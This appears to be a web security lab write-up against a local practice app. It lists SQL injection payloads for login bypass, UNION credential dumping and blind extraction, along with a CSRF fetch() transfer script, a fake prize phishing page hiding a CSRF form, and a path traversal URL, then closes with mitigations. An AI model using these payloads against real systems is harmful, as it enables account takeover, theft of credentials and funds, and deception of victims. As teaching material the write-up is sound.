
## 1. SQL INJECTION VECTORS (MariaDB Compatible)

---

### a) **Login Bypass**

**Payload Example 1**

- **Email**: " OR ""="' OR 1=1 -- 
    
- **Password**: anything
    

**Injected Query**:

```sql
SELECT * FROM users WHERE email='' OR 1=1 -- ' AND pass='anything'
```

---
**MariaDB-Specific Variant**

- **Email**: `admin@example.com' #`
    
- **Password**: anything
    

**Injected Query**:

```sql
SELECT * FROM users WHERE email='admin' # ' AND pass='anything'
```

Note: `#` is a valid comment character in MariaDB (like `--` ), and it ignores the rest of the line.

---

### b) **UNION-Based Attack**

**Payload**:

- **Search**: `' UNION SELECT 1, CONCAT(email, ':', pass), 3 FROM users -- `
    

**Injected Query**:

```sql
SELECT id, name, info FROM products WHERE name='' UNION SELECT 1, CONCAT(email, ':', pass), 3 FROM users -- '
```

This would display all users’ credentials in the search results (if column counts and types match).

---

### c) **Blind SQL Injection**

**Payload**:

- **Email**: `admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a`
    

**Injected Query**:

```sql
SELECT * FROM users 
WHERE email='admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a'
```

This doesn't reveal errors or results directly, but with repeated guessing, the attacker can infer the password one character at a time.

---

## 2. CSRF Attack Vectors

### JavaScript `fetch()` Method (IMG Tag Alternative)

This uses `fetch()` to simulate a form submission directly in JavaScript:

```html
<script>
fetch("http://localhost/login_app/dashboard.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "to_id=7&amount=10000000&transfer=Transfer+Money"
});
</script>
```

> **Note:** While `fetch()` doesn't work cross-origin by default (due to CORS), it's still useful for same-origin CSRF or if the target lacks proper protections.
---

3. Social Engineering
Fake Prize Page with Hidden CSRF Attack

This is an example of a phishing page designed to trick users into clicking a button under the pretense of winning a prize. In reality, clicking the button submits a hidden form that performs a CSRF attack — transferring money without the user’s knowledge.
Malicious HTML Overview:

<form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame">
    <input type="hidden" name="to_id" value="2">
    <input type="hidden" name="amount" value="500">
    <input type="hidden" name="transfer" value="Transfer Money">
</form>

<button onclick="document.getElementById('csrf-form').submit();">
    Claim Your Prize Now!
</button>

How it works:

    The page is styled to look legitimate (e.g., prize claim, congratulatory message).

    The user is encouraged to click a big, friendly button to "claim a prize".

    Clicking the button submits a hidden form, which:

        Sends a POST request to the target site (dashboard.php)

        Transfers 500 units to user ID 2, impersonating the victim.

    The request is executed silently inside an iframe, giving no indication to the victim.

    If the victim is already logged in to the vulnerable site (localhost/login_app), the action is performed using their session.

This is a classic CSRF combined with social engineering, where the attacker uses deceptive UI to exploit a user’s trust and active session.

---
## 4. Path Traversal Exploitation

### Reading Sensitive Files

Use directory traversal sequences to access files outside the intended path:

```
http://localhost/login_app/../passwords.txt
```
Let's say that we have a passwords.txt file outside of our website. Using the "../" syntax we escape the site's scope and retreive any files outside of the folder. So ../passwords.txt will get us the passwords.txt file outside of the folder.

This can expose sensitive configuration files, credentials, or other private data if the server doesn’t sanitize the `path` input.

---

## 5. Prevention Techniques

>  For educational purposes — here’s how to fix or mitigate the common vulnerabilities:

---

### a) **SQL Injection**

-  Use **prepared statements** with **parameterized queries**
    
-  Apply strict **input validation** (whitelisting where possible)
    
-  Follow the **principle of least privilege** (minimal DB rights)
    

---

### b) **Cross-Site Request Forgery (CSRF)**

-  Add **anti-CSRF tokens** in forms and validate them server-side
    
-  Use `SameSite` attribute for cookies (`SameSite=Strict` or `Lax`)
    
-  Validate the **Referer** or **Origin** header for critical actions
    
---

### c) **Path Traversal**

-  **Validate and sanitize** all user-controlled file paths
    
-  Use **server-side path whitelisting** or mapping
    
-  Enforce **access control** checks for file operations
    

---

### d) **Authentication & Session Management**

-  Implement proper **session validation** and timeouts
    
-  Use strong **password hashing** (e.g., bcrypt, Argon2) with salting
    
-  Apply **account lockout** or throttling to prevent brute-force attacks
    
